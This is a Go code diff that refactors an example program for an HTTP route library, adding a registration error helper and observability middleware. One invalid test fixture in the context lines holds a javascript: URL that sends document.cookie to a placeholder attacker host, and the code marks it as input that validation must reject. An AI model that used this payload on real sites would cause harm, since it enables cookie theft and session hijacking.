@@ -137,6 +137,14 @@ func (o *CountingObserver) Print() {
 
 // ── Main ──────────────────────────────────────────────────────────────────────
 
+// mustRegister exits the program if nethttp.Register returns an error.
+func mustRegister(err error) {
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "nethttp.Register failed: %v\n", err)
+		os.Exit(1)
+	}
+}
+
 func main() {
 	// ── Route definition ─────────────────────────────────────────────────────
 	//
@@ -184,8 +192,9 @@ func main() {
 		}, nil
 	}
 
+	obsMw := nethttp.ObservabilityMiddleware(obs)
 	mux := http.NewServeMux()
-	nethttp.Register(mux, articleRoute, handler, nethttp.Options{Observer: obs})
+	mustRegister(nethttp.Register(mux, articleRoute, handler, nethttp.Options{}, obsMw))
 	srv := httptest.NewServer(mux)
 	defer srv.Close()
 
@@ -215,7 +224,7 @@ func main() {
 	// articleCard component is never rendered with invalid data.
 
 	invalidMux := http.NewServeMux()
-	nethttp.Register(invalidMux, articleRoute, func(_ context.Context, _ struct{}) (ArticleProps, error) {
+	mustRegister(nethttp.Register(invalidMux, articleRoute, func(_ context.Context, _ struct{}) (ArticleProps, error) {
 		return ArticleProps{
 			ID:          "not-a-uuid",   // fails UUID
 			Title:       "",             // fails NonEmptyString
@@ -224,7 +233,7 @@ func main() {
 			Date:        "32/13/9999",                                                        // fails Date
 			ReadMoreURL: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", // fails URL scheme
 		}, nil
-	}, nethttp.Options{Observer: obs})
+	}, nethttp.Options{}, obsMw))
 	invalidSrv := httptest.NewServer(invalidMux)
 	defer invalidSrv.Close()
 
